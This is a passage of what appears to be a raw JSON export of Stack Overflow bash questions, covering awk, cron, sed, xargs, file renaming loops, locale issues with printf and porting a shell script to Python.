0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349851260, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349851320, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0\n1349851380, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 227.736, 2, 0, 29620, 0, 0, 0, 0, 0\n1349851440, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n#!/bin/bash\nFILENAME=$1\n\nawk '{kount++;print  kount, $0}     END{print \"\\nTotal \" kount \" lines read\"}' $FILENAME\nawk '{print $13}' $FILENAME\n</code></pre>\n\n<p>Desired Output - </p>\n\n<pre><code>   227.736, 2,  29378 \n   227.736, 2,  29620\n</code></pre>\n\n<p>Thanks for help.\nNaveen</p>\n"},{"tags":["git","bash","command"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":96,"score":-1,"question_id":11506124,"title":"How to enter command with password for git pull?","body":"<p>I want to do this command in one line: git pull &amp;&amp; [my passphrase]</p>\n\n<p>How to do it?</p>\n"},{"tags":["bash","shell","ubuntu","amazon-s3","s3cmd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12857907,"title":"Debugging my cron application","body":"<p>I have a code like this :</p>\n\n<pre><code>set -e\nset -x\nfolderName=$(echo `date +%Y/%m/%d/`);\nfileName=x.x.x.x.x.x.x.log \ncp x.x.x.x.x.x/$1 $fileName  \ngzip $fileName  \ns3cmd put $fileName.gz s3://x.x.x.x.x/$folderName    \nrm $fileName.gz\n</code></pre>\n\n<p>This is working fine if I run like this : </p>\n\n<pre><code>./shell logfilelocation\n</code></pre>\n\n<p>And when I added into the crontab like this :</p>\n\n<pre><code>* * * * * /home/x.x.x/testing/s3 -f x.x.x.log &gt;&gt; /tmp/mys3Log\n</code></pre>\n\n<p>And I waited! The file <code>mys3Log</code> gets created. But there is no content in it! I expect the result of command execution ( as I have used <code>set -e ; set -x</code> in my code ) should go into the <code>mys3Log</code> file as I'm doing a redirect there. </p>\n\n<p>But something is going wrong. I'm very new to bash programming and cron. </p>\n\n<p>Where I'm making the mistake? </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["linux","bash","shell","script","jarsigner"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12855978,"title":"Shell passing keystore path parameter in jarsigner","body":"<p>I have this</p>\n\n<pre><code>KEY_STORE_PATH=/home/userr/mykeystore\n\njarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore \"$KEY_STORE_PATH\" bin/PName-release-unsigned.apk alias_name\n</code></pre>\n\n<p>and it doesn't work, after this command the apk file it is not signed...</p>\n\n<p>But when I do this it works just fine</p>\n\n<pre><code>jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore /home/userr/mykeystore bin/PName-release-unsigned.apk alias_name\n</code></pre>\n\n<p>EDIT:\nactually what I do is the following</p>\n\n<pre><code>echo ` echo \"pass\" | jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore \"$KEY_STORE_PATH\" bin/PName-release-unsigned.apk alias_name`\n</code></pre>\n\n<p>no I can guess what is the problem but , is there solution for this kind of situation ?</p>\n\n<p>EDIT 2</p>\n\n<p>I did short test</p>\n\n<p>In shell</p>\n\n<pre><code> #  asd=123\n #  echo `echo $asd`\n #  123\n</code></pre>\n\n<p>it print 123 correctly so I think something else is the problem</p>\n"},{"tags":["ruby","bash","pdf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12831990,"title":"Check PDF if document is blank in bash or ruby","body":"<p>I'm trying merge several pdf files into one page. I am using ghostcript to merge all of them but I have problem when I merge one with a blank page.  So I have to check each one for a blank pdf document. Is there any way to do this with the standard bash shell or Ruby language?</p>\n\n<p>I am using pdffonts to identify if the pdf is blank or not. I'm using the command :</p>\n\n<blockquote>\n  <p>pdffonts 00001.pdf</p>\n</blockquote>\n\n<p>and if the pdf is blank the result is :</p>\n\n<pre><code>name                                type              emb sub uni object ID\n\n------------------------------------ ----------------- --- --- --- ---------\n</code></pre>\n\n<p>if the pdf is not blank the result is </p>\n\n<pre><code>name                                 type              emb sub uni object ID\n------------------------------------ ----------------- --- --- --- ---------\nHelvetica                            Type 1            no  no  no       6  0\n</code></pre>\n"},{"tags":["regex","linux","bash","sed"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12856229,"title":"Bash script to change config using sed","body":"<p>I'm trying to change the value of malloc to say 1234m via a bash script but not seeing any changes.  I presume it is an issue with my regex, can anybody see what I've done inncorrectly?</p>\n\n<p>String</p>\n\n<pre><code>DAEMON_OPTS=\"-a :6081 \\\n             -T localhost:6082 \\\n             -f /etc/varnish/default.vcl \\\n             -S /etc/varnish/secret \\\n             -s malloc,256m\"\n</code></pre>\n\n<p>Code</p>\n\n<pre><code># get the memory allocation\necho \"Enter the memory allocation\"\nread malloc\n\n# update the default config\nsed -ie 's/malloc,.*[0-9m]$/malloc,'$malloc'/gI' /etc/default/varnish\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12855610,"title":"shell script - is there any way converting number to char?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/890262/integer-ascii-value-to-character-in-bash-using-printf\">Integer ASCII value to character in BASH using printf</a>  </p>\n</blockquote>\n\n\n\n<p>I want to convert my integer number to ASCII character</p>\n\n<p>We can convert in java like this:</p>\n\n<pre><code>int i = 97;          //97 is \"a\" in ASCII\nchar c = (char) i;   //c is now \"a\"\n</code></pre>\n\n<p>But,is there any way in to do this shell scripting?</p>\n"},{"tags":["linux","bash","script","grep","extract"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12854667,"title":"What is the easiest way of extracting strings from source files?","body":"<p>I was asked today to list all image files references in our project to help remove/fix dead references.</p>\n\n<p>All our image names in the source files are enclosed in either simple or double quotes (<code>'image.png'</code> or <code>\"image.png\"</code>).</p>\n\n<p>To extract those I thought of using <code>grep</code>, <code>sed</code> an other tools like that but so fair I failed to come up with something effective.</p>\n\n<p>I can currently list all lines that contain image names by grepping the image file extensions (<code>.png</code>, <code>.gif</code>, and so on) but that also brings lines completely unrelated to my search. My attempt with sed wasn't working in case there was several strings per line.</p>\n\n<p>I could probably filter out the list by myself, but hey: this is linux ! So there has to be a tool for the job.</p>\n\n<p>How would you do that ?</p>\n"},{"tags":["bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12854848,"title":"Is this a bug in Bash shell","body":"<p>Did I found a bug in bash ?? </p>\n\n<ul>\n<li>1: I have created a folder named <code>Test</code></li>\n<li>2: cd Test/</li>\n<li>3: rm -rf ../Test (Deleted the PWD while I was in that Directory As shown in Pic) <img src=\"http://i.stack.imgur.com/7Rb38.png\" alt=\"This Picture show it..\"></li>\n<li>4: Clarify the issue in Stackoverflow...</li>\n</ul>\n"},{"tags":["linux","bash","shell","unix","script"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":69,"score":1,"question_id":12854295,"title":"Bash script wait if already running, then continue","body":"<p>I have a bash script that is called by a program once a process is complete. I need a way for that bash script to wait if another instance of itself is running to exit before continuing. I can't just use lock files and exit because the script will not be called again on any kind of regular schedule.</p>\n"},{"tags":["linux","bash","pipes"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":241,"score":1,"question_id":10297060,"title":"how to build a delayed / buffered pipe?","body":"<p>Is it possible to build a buffered pipe  that retains data (for some given amount of bytes or some given time) from standard linux tools like cat, dd etc.?</p>\n\n<p>For example to collect a defined amount of packets, audio data or something else. </p>\n\n<p>Eg. to build a script <code>delaybuffer</code> to do something like that: </p>\n\n<pre><code>arecord | delaybuffer 16000 | aplay\n</code></pre>\n\n<p>to playback the recorded audio 16000 bytes delayed. </p>\n"},{"tags":["bash","logging","nohup"],"answer_count":1,"favorite_count":3,"up_vote_count":14,"down_vote_count":0,"view_count":6007,"score":14,"question_id":4549489,"title":"Can I change the name of `nohup.out`?","body":"<p>When I run <code>nohup some_command &amp;</code>, the output goes to <code>nohup.out</code>; <code>man nohup</code> says to look at <code>info nohup</code> which in turn says:</p>\n\n<blockquote>\n  <p>If standard output is a terminal, the\n  command's standard output is appended\n  to the file 'nohup.out'; if that\n  cannot be written to, it is appended\n  to the file '$HOME/nohup.out'; and if\n  that cannot be written to, the command\n  is not run.</p>\n</blockquote>\n\n<p>But if I already have one command using <code>nohup</code> with output going to <code>/nohup.out</code> and I want to run another, <code>nohup</code> command, can I redirect the output to <code>nohup2.out</code>? </p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":533,"score":0,"question_id":7034838,"title":"Exit a bash switch statement","body":"<p>I've written a menu driven bash script that uses a <code>switch case</code> inside of a <code>while</code> loop to perform the various menu options. Everything works just fine. Now I'm trying to improve the program by performing error testing on the user input, but I cannot seem to make it work... </p>\n\n<p>The problem is I don't know how to properly break out of a switch statement, without breaking out of the while loop (so the user can try again).</p>\n\n<pre><code># repeat command line indefinitely until user quits\nwhile [ \"$done\" != \"true\" ]\ndo\n   # display menu options to user\n   echo \"Command Menu\" # I cut out the menu options for brevity....\n\n   # prompt user to enter command\n   echo \"Please select a letter:\"\n   read option\n\n   # switch case for menu commands, accept both upper and lower case\n   case \"$option\" in\n\n   # sample case statement\n   a|A) echo \"Choose a month\"\n        read monthVal\n        if [ \"$monthVal\" -lt 13 ]\n        then \n           cal \"$monthVal\"\n        else\n           break # THIS DOES NOT WORK. BREAKS WHILE LOOP, NOT SWITCH!\n        fi\n        ;;\n   q|Q) done=\"true\" #ends while loop\n        ;;\n   *)   echo \"Invalid option, choose again...\"\n        ;;\n   esac\ndone\nexit 0\n</code></pre>\n\n<p>The program works fine when the user enters a valid month value, but if they enter a number higher than 13, instead of breaking the switch statement and repeating the loop again, the program breaks both the switch and while loop and stops running.</p>\n"},{"tags":["bash","shell","unix"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":780305,"title":"Loops in Shell Scripting","body":"<p>I need help with this shell script.</p>\n\n<ol>\n<li>Must use a loop of some sort.</li>\n<li>Must use input data exactly as shown.</li>\n<li>Output redirection should be accomplished within the script, not on the command line.</li>\n</ol>\n\n<p>Here's the input files I have:\n<a href=\"http://pastebin.com/m3f783597\" rel=\"nofollow\">http://pastebin.com/m3f783597</a></p>\n\n<p>Here's what the output needs to be:\n<a href=\"http://pastebin.com/m2c53b25a\" rel=\"nofollow\">http://pastebin.com/m2c53b25a</a></p>\n\n<p>Here's my failed attempt:\n<a href=\"http://pastebin.com/m2c60b41\" rel=\"nofollow\">http://pastebin.com/m2c60b41</a></p>\n\n<p>And that failed attempt's output:\n<a href=\"http://pastebin.com/m3460e78c\" rel=\"nofollow\">http://pastebin.com/m3460e78c</a></p>\n"},{"tags":["bash","curl","escaping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12849584,"title":"Automatically add newline at end of curl command","body":"<p>If the HTTP response body for a curl request doesn't contain a trailing newline, I end up with this really annoying condition where the Bash prompt is in the middle of the line, and escaping is messed up enough that when I put the last curl command on the screen, deleting characters from that curl command delete the wrong characters.</p>\n\n<p>For example:</p>\n\n<pre><code>[root@localhost ~]# curl jsonip.com\n{\"ip\":\"10.10.10.10\",\"about\":\"/about\"}[root@localhost ~]#\n</code></pre>\n\n<p>Is there a trick I can use to automatically add a newline at the end of a curl request, to get the prompt back on the left edge of the screen?</p>\n"},{"tags":["bash","xargs"],"answer_count":4,"favorite_count":3,"up_vote_count":15,"down_vote_count":0,"view_count":3200,"score":15,"question_id":6958689,"title":"xargs with multiple commands as argument","body":"<pre><code>cat a.txt | xargs -I % echo %\n</code></pre>\n\n<p>In the example above xargs takes 'echo %' as the command argument. But in some cases, I need multiple commands to process instead of one, for example:</p>\n\n<pre><code>cat a.txt | xargs -I % {command1; command2; ... }\n</code></pre>\n\n<p>But xargs doesn't accept this form. One solution I know is that I can define a function to wrap the commands, but it's not pipeline, I don't prefer it. Is there other solution? Thanks in advance. </p>\n"},{"tags":["android","bash","shell","input","adb"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":183,"score":1,"question_id":11479502,"title":"Bash script to launch app and login - gets stuck, cursor doesn't move down the page","body":"<p>What I want to do: Clear the data, then launch my app. On the first page, tab down and agree to conditions, then on next page tab down to the sign-in textfields, enter the username, password, then tap sign in. </p>\n\n<p>What happens is the data is cleared, the app is launched, then the app just sits on the terms/conditions screen, and the cursor does not move down to the buttons. </p>\n\n<p>What am I missing? Do I need to bring the focus to the screen so that the cursor gets a location before I move it?</p>\n\n<pre><code>#!/bash/src\n\nadb shell pm clear com.myapp.package\nadb shell am start -n com.myapp.package/com.myapp.package.Main\nadb shell input keyevent 20 \nadb shell input keyevent 20\nadb shell input keyevent 20\nadb shell input keyevent 20\nadb shell input keyevent 21\nadb shell input keyevent 66\nadb shell input text \"username\"\nadb shell input keyevent 20\nadb shell input text \"password\"\nadb shell input keyevent 20\nadb shell input keyevent 66\n</code></pre>\n"},{"tags":["python","bash","script"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12781161,"title":"Bash to Python: flatten directory tree","body":"<p>On Unix-like systems I use this script, which I'd like some help on porting to Python for execution on Windows hosts:</p>\n\n<hr>\n\n<pre><code>#!/bin/bash\n\nSENTINEL_FILENAME='__sentinel__'\nSENTINEL_MD5_CHECKSUM=''\nSENTINEL_SHA_CHECKSUM=''\n\nfunction is_directory_to_be_flattened() {\n\n  local -r directory_to_consider=\"$1\"\n  local -r sentinel_filepath=\"${directory_to_consider}/${SENTINEL_FILENAME}\"\n\n  if [ ! -f \"${sentinel_filepath}\" ]; then\n    return 1\n  fi\n\n  if [[\n      \"$(\n         md5 \"${sentinel_filepath}\" \\\n           | awk '{ print $NF }' 2&gt; /dev/null\n       )\" \\\n        == \"${SENTINEL_MD5_CHECKSUM}\"\n    &amp;&amp; \\\n      \"$(\n         shasum -a 512 \"${sentinel_filepath}\" \\\n           | awk '{ print $1 }' 2&gt; /dev/null\n       )\" \\\n        == \"${SENTINEL_SHA_CHECKSUM}\"\n  ]]; then\n    return 0\n  else\n    return 1\n  fi\n}\n\nfunction conditionally_flatten() {\n\n  local -r directory_to_flatten=\"$1\"\n  local -r flatten_into_directory=\"$2\"\n\n  if is_directory_to_be_flattened \"${directory_to_flatten}\"; then\n\n    if [ ! -d \"${flatten_into_directory}\" ]; then\n      mkdir -v \"${flatten_into_directory}\"\n    fi\n\n    for file_to_move in $(find ${directory_to_flatten} -type f -maxdepth 1); do\n      mv \\\n        -v \\\n        -n \\\n        \"${file_to_move}\" \\\n        \"${flatten_into_directory}\"\n    done\n  fi\n}\n\nfunction flatten_directory() {\n\n  local -r directory_to_flatten=\"$1\"\n  local -r descend_depth=\"$2\"\n\n  local -r flattened_directory=\"${directory_to_flatten}/__flattened__\"\n\n  if [ ! -d \"${directory_to_flatten}\" ]; then\n    printf \"The argument '%s' does not seem to be a directory.\\n\" \\\n      \"${directory_to_flatten}\" \\\n      &gt;&amp;2\n    return\n  fi\n\n  find \"${directory_to_flatten}\" \\\n    -type d \\\n    -maxdepth \"${descend_depth}\" \\\n  | \\\n    while read directory_path; do\n      conditionally_flatten \\\n        \"${directory_path}\" \\\n        \"${flattened_directory}\"\n    done\n}\n\nn_arguments=\"$#\"\n\nif [ \"${n_arguments}\" -eq 1 ]; then\n  flatten_directory \"$1\" '1' # maybe use a constant, not a \"magic #\" here?\nelse\n  echo usage: \"$0\" /path/to/directory/to/flatten\nfi\n\nunset is_directory_to_be_flattened\nunset conditionally_flatten\nunset flatten_directory\n</code></pre>\n\n<hr>\n\n<p>How would you port this to Win Python? I am a beginner in both Python and Bash scripting..</p>\n\n<p>Feel free to upgrade my implementation as you port it if you find it lacking in any way too, with a justification please. This is not \"Code Review\" but a \"thumbs up/thumbs down\" on my effort in Bash would give me a sense of whether I am improving or I should change the way I study altogether...</p>\n\n<hr>\n\n<p>Here we go, my attempt in Python: (criticise it <em>hard</em> if need be, it's the only way for me to learn!)</p>\n\n<hr>\n\n<pre><code>#!/usr/bin/env python2.7\n\nimport sys\nimport os\nimport shutil\n\nSENTINEL_FILENAME=''\nSENTINEL_MD5_CHECKSUM=''\nSENTINEL_SHA_CHECKSUM=''\n\nDEFAULT_DEPTH = 1\nFLATTED_DIRECTORY_NAME = '__flattened__'\n\ndef is_directory_to_be_flattened(directory_to_consider):\n  sentinel_location = os.path.join(directory_to_consider, SENTINEL_FILENAME)\n  if not os.path.isfile(sentinel_location):\n    return False\n  import hashlib\n  with open(sentinel_location) as sentinel_file:\n    file_contents = sentinel_file.read()\n    return (hashlib.md5(file_contents).hexdigest() == SENTINEL_MD5_CHECKSUM\n      and hashlib.sha512(file_contents).hexdigest() == SENTINEL_SHA_CHECKSUM)\n\ndef flatten(directory, depth, to_directory, do_files_here):\n  if depth &lt; 0:\n    return\n  contained_filenames = [f for f in os.listdir(directory)]\n  if do_files_here:\n    for filename in contained_filenames:\n      if filename == SENTINEL_FILENAME:\n        continue\n      filepath = os.path.join(directory, filename)\n      if not os.path.isfile(filepath):\n        continue\n      file_to = os.path.join(to_directory, filename)\n      if not os.path.isdir(to_directory):\n        os.makedirs(to_directory)\n      if not os.path.isfile(file_to):\n        print \"Moving: '{}' -&gt; '{}'\".format(filepath, file_to)\n        shutil.move(filepath, file_to)\n      else:\n    sys.stderr.write('Error: {} exists already.\\n'.format(file_to))\n  next_depth = depth - 1\n  for subdirectory in (d for d in contained_filenames if os.path.isdir(d)):\n    if is_directory_to_be_flattened(subdirectory):\n      flatten(subdirectory, next_depth, to_directory, True)\n\ndef flatten_directory(to_flatten, depth):\n  to_directory = os.path.join(to_flatten, FLATTED_DIRECTORY_NAME)\n  if not os.path.isdir(to_flatten):\n    sys.stderr.write(\n      'The argument {} does not seem to be a directory.\\n'.format(\n      to_flatten))\n    return\n  flatten(to_flatten, depth, to_directory, False)\n\ndef main():\n  if len(sys.argv) == 2:\n    flatten_directory(sys.argv[1], DEFAULT_DEPTH)\n  else:\n    print 'usage: {} /path/to/directory/to/flatten'.format(sys.argv[0])\n\nif __name__ == '__main__':\n  main()\n</code></pre>\n\n<hr>\n\n<p>Although it's obvious from the code, the intent is:</p>\n\n<ul>\n<li>Start at a given directory</li>\n<li>Descend up to a certain depth</li>\n<li>Consider subdirectories and move all files therein if and only if:\n<ul>\n<li>The directory contains a \"sentinel file\" with a given filename</li>\n<li>The sentinel file is <em>actually</em> a sentinel file, not just a file renamed to the same name</li>\n</ul></li>\n<li>Collate files in a <code>__flattened__</code> directory under the directory in which the search started</li>\n</ul>\n"},{"tags":["bash","quote"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12811270,"title":"Is there a bash equivalent for ruby %{} quoting?","body":"<p>What is the easiest way to quote bash command arguments that contain single quotes and double quotes without variable interpolation?</p>\n\n<p>In Ruby you can quote strings using %{}, %[] etc. In that case single quotes and double quotes will be treated as characters.</p>\n\n<p>My question was not really complete here is further explanation:</p>\n\n<p>The reason I am asking that is because I often run ruby and perl code at the command line. Since those languages are using extensively single quotes and double quotes and global variables like $1 $_ etc. I get conflicts with bash.</p>\n\n<p>example:</p>\n\n<pre><code>ls -lat | ruby -p -e '$_ =~ /(\\S+)\\s+(\\S+)\\s+(\\S+)/; $_ = \"'\\''\" + ($3 || \"\") + \"'\\''\" + \"\\n\"'\n</code></pre>\n\n<p>I was looking for something similar to the % quoting in ruby:</p>\n\n<pre><code>ls -lat | ruby -p -e %{$_ =~ /(\\S+)\\s+(\\S+)\\s+(\\S+)/; $_ = \"'\" + ($3 || \"\") + \"'\" + \"\\n\"}\n</code></pre>\n"},{"tags":["bash","parsing","mongodb","bson"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":12318086,"title":"BASH BSON parser","body":"<p>We need to do some queries of a Mongo DB from BASH shell scripts.  Using eval and Mongo's printjson() gives me text output, but it needs to be parsed.  Using other scripting languages (Python, Ruby, Erlang, etc) is not an option.</p>\n\n<p>I looked at JSON.sh ( a BASH script lib JSON parser: <a href=\"https://github.com/rcrowley/json.sh\" rel=\"nofollow\">https://github.com/rcrowley/json.sh</a> ) and it appears to be close to a solution other than the issue that it does not recognize BSON-but-not-JSON data types.  Before I try to mod it to recognize BSON data types, is anyone aware of an existing solution?</p>\n\n<p>Thanks.</p>\n\n<p>10/11   Below Stennie notes that I have received an answer in the MongoDB User group, and provides a URL.  The answer is very nice and complete, and begins, \"MongoDB actually uses what we call Mongo Extended JSON which differs a bit from the vanilla JSON standard...\" so I will have to modify the parser.  Thanks to all.</p>\n"},{"tags":["bash","hex","ascii"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":12847328,"title":"bash ascii to hex","body":"<p>was wondering if anyone could help me with converting ascii to hex in bash.\nExample code:</p>\n\n<pre><code>#!/bin/bash \nSTR = \"hello\"\n#Convert to hex\nHEXVAL = $STR #(in hex here?)\n</code></pre>\n\n<p>I want hexval to have the value:\n68656C6C6F (hello in hex)</p>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12844490,"title":"How to check if all the files in a folder are of the same format","body":"<p>I have a folder which contains a list of files. The problem is they dont have extensions. I want to check if they are JPEG or JPG format. I tried this </p>\n\n<pre><code>find folder -type f -not -name \"*.*\"\n</code></pre>\n\n<p>The output is </p>\n\n<pre><code>folder/t351\nfolder/t352\nfolder/t353\nfolder/t354\nfolder/t355\n</code></pre>\n\n<p>I tried using Regex but since the name of the files have no extensions It din't work out.\nCan someone tell me how I can validate the files and check if they have a certain format. </p>\n"},{"tags":["bash","ubuntu","expect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12845159,"title":"Rebuild kill script","body":"<p>I'm using the following script now on cent-os, but it does not work, cause it is a ubuntu script?</p>\n\n<pre><code>#!/usr/bin/expect -f\nset pid_num [lrange $argv 0 0]\nsend \"kill -9 $pid_num\\r\"\nexpect \"#\" { send \"q\" }\nexit\n</code></pre>\n\n<p>At the moment i got this for cent-os:</p>\n\n<pre><code>#!/bin/sh\nset pid_num foreach {pid_num} $argv {break}\necho '$1 = '$1\n\nkill $1 $*\nexit $?\n</code></pre>\n\n<p>I don't know what's wrong.\nWhat is must do is ./kill.sh (pidnumber) A php script will run this bashfile.</p>\n"},{"tags":["linux","bash","curl","wget"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12846933,"title":"WGET or cURL to get file with protection","body":"<p>Which is going to be the best route to download a file from a remote webserver? I want to use .htaccess to deny all downloads unless a specific useragent is passed. Would this have to be done via cURL or can WGET do this too?</p>\n"},{"tags":["bash","loops"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":37,"score":-1,"question_id":12846542,"title":"Renaming Loop for files in Linux","body":"<p>I'm trying to create a for loop that goes through a directory, and renames each file in that directory. </p>\n\n<pre><code>dir2=$1\n\nfor i in $dir2\ndo\nfile=$(basename \"$i\")\nb=${file%.*}\nc=${file#\"$stub\"}\nd=-BACKUP\ne=$b$d$c\nmv \"$i\" \"$e\"\n</code></pre>\n\n<p>I'm trying to change each file:i to become $e.</p>\n\n<p>For example, if I have a directory, and there is one file in it called test.txt, the file would be changed to test-BACKUP.txt</p>\n\n<p>I'm having problems in that it's not changing the files withing the directories, it's changing the directory itself. </p>\n"},{"tags":["linux","bash","shell","gnu-screen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12846557,"title":"how to log the output of a session generated by \"screen\" command?","body":"<p>I am running several screen sessions in the same directory at the same time. When the program in a certain session is completed, this session is terminated automatically, however, I need to check the output of the session. So I tried to use \"screen -L\" to keep a log, however, the outputs of all the sessions were logged into a single file screenlog.0 (several lines from one session and then several lines from another session... which is impossible to read). I am wondering if there is any method to record different sessions to different log files? </p>\n"},{"tags":["bash","printf"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":12845997,"title":"Unexplicable error in bash: printf command inside a script returns \"invalid number\"","body":"<p>I can't get <code>printf</code> to print a variable with the %e descriptor in a bash script. It would just say</p>\n\n<pre><code>#!/bin/bash\na=14.9\nprintf %e 14.9;\n</code></pre>\n\n<p>I know this is likely a very easy question, but I'm fairly new to bash and always used <code>echo</code>. Plus I couldn't find an answer anywhere.</p>\n\n<hr>\n\n<p>when run i get</p>\n\n<pre><code>$ ./test.text\n./test.text: line 3: printf: 14.9: invalid number\n0,000000\n</code></pre>\n\n<p>therefore my problem is the locale variable LC_NUMERIC: it is set so that i use commas as decimal separators. Indeed, it is set to an european localization:</p>\n\n<pre><code>$ locale | grep NUM\nLC_NUMERIC=\"it_IT.UTF-8\"\n</code></pre>\n\n<p>I thought I set it to en_US.UTF-8, but evidently I didn't. Now the problem switches to find how to set my locale variable. Simply using</p>\n\n<pre><code>$ LC_NUMERIC=\"en_US.UTF-8\"\n</code></pre>\n\n<p>won't work.</p>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12845283,"title":"lower case to upercase conversion","body":"<p>I found solution but it doesn't working <a href=\"http://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/\" rel=\"nofollow\">http://www.cyberciti.biz/faq/linux-unix-shell-programming-converting-lowercase-uppercase/</a></p>\n\n<pre><code>[root@mg0016 tmp]# y=\"this Is A test\"\n[root@mg0016 tmp]# echo \"${y^^}\"\n-bash: ${y^^}: bad substitution\n</code></pre>\n"},{"tags":["bash","loops"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12845894,"title":"Backup file loop in bash","body":"<p>I'm writing a script that takes a directory, copies all the files from it to a new one, then renames all the files in the new directory to include a -BACKUP in their name before an extension.</p>\n\n<p>so far I have: </p>\n\n<pre><code>dir1=$1\ndir2=$2\n\nmkdir $dir2\ncp -r $dir1/. $dir2\n\nfor i in $dir2\ndo\nfile=$(basename \"$i\")\nb=${file%.*}\nc=${file#\"$stub\"}\nd=-BACKUP\ne=$b$d$c\nmv $i $e\n\ndone\n</code></pre>\n\n<p>Although this only changes the name of the directory, not all the files within the directory. </p>\n\n<p>What am I doing wrong, how would you approach this? </p>\n"},{"tags":["bash","shell","sed","awk","objdump"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12844443,"title":"Using sed and awk together to create replacement maps","body":"<p>I'm attempting to reverse engineer some software to gain a better understanding the lower-level workings of the OS. I want to replace the raw address dumps from objdump -d with the corresponding values from objdump -t, something that even the -Dslx option seems to miss.</p>\n\n<p>the output from objdump -t looks like this:</p>\n\n<pre><code>00000000 l    d  .bss   00000000 .bss\n00000000 g       .text  00000000 fred\n</code></pre>\n\n<p>and I am able to extract the needed information using awk at indexes 1 and NF(the actual code I used is at another computer). For each record I put the fields into an array: </p>\n\n<pre><code>fields[$1] = $NF\n</code></pre>\n\n<p>and from here I am kind of lost. I want to use these entries to replace all occurrences of 'location' with </p>\n\n<pre><code>fields[location]\n</code></pre>\n\n<p>At this point I am just printing out the sed command to use next, then manually copying and pasting the command and executing it. it comes out looking like</p>\n\n<pre><code>objdump -d test.o | sed -e 's/&lt;loc1&gt;/&lt;name1&gt;/g' \n                        -e 's/&lt;loc2&gt;/&lt;name2&gt;/g' \n                        . . . \n                        -e 's/&lt;locN&gt;/&lt;nameN&gt;/g'\n</code></pre>\n\n<p>I don't really like this, I want to completely automate this. I'm relatively inexperienced with some of the Bash tricks so chances are there's a simple solution I've never heard of.</p>\n\n<p>example: (I don't have access to actual inputs at this point, but this is close enough for the goal I have)</p>\n\n<pre><code>00000000 g     O .bbs 00000010 size\n00000012 g     O .bbs 00000004 count\n00000200 l     F .bbs 00000020 anotherVar\n</code></pre>\n\n<p>+</p>\n\n<pre><code>0x0000030 &lt;main&gt;:\n    0x00000034    xx xx      mov   0x00000000, %eax\n    0x00000038    xx         push  0x00000012\n    0x0000004c    xx xx xx   subl  0x00000200, %ebx\n</code></pre>\n\n<p>=</p>\n\n<pre><code>0x0000030 &lt;main&gt;:\n    0x00000034    xx xx      mov   size, %eax\n    0x00000038    xx         push  count\n    0x0000004c    xx xx xx   subl  anotherVar, %ebx\n</code></pre>\n"},{"tags":["linux","bash","shell","ssh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12845206,"title":"check if file exists on remote host with ssh","body":"<p>I would like to check if a certain file exists on the remote host.\nI tried this:</p>\n\n<pre><code>$ if [ ssh reg@localhost 